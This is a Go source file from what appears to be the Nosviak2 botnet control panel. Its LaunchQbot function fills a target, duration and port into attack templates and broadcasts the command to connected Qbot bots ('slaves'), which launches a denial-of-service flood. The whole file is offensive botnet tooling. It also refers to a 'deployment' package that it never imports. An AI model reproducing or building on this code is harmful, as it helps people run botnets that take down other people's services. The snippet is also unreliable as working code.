package attacks

import (
	"Nosviak2/core/clients/sessions"
	"Nosviak2/core/configs"
	"Nosviak2/core/slaves/qbot"
	"Nosviak2/core/sources/language"
	"strings"
)

//builds and launches the qbot attack towards
//this will launch towards all possible commands
func LaunchQbot(command []string, m *Method, s *sessions.Session) (bool, error) {

	//invalid command length has been given
	//this will only alert when the length isn't valud
	if len(command) < 4 { //length guide checks properly
		return false, language.ExecuteLanguage([]string{"attacks", "syntax.itl"}, s.Channel, deployment.Engine, s, make(map[string]string))
	}

	var credential []string = make([]string, len(m.QbotArguments))

	target := command[1] //target
	duration := command[2] //duration
	port := command[3] //port
	
	//ranges through the command launch arguments
	//this will ensure its been built within issues happening
	for pos, arg := range m.QbotArguments { //ranges through properly
		credential[pos] = strings.ReplaceAll(arg, "<<$target>>", target) //target
		credential[pos] = strings.ReplaceAll(credential[pos], "<<$port>>", port) //port
		credential[pos] = strings.ReplaceAll(credential[pos], "<<$duration>>", duration) //duration
	}


	//broadcasts the command towards the bots connected
	qbot.Broadcast([]byte(strings.Join(credential, " ")))

	//TODO: broadcast the command to devices
	return true, nil
}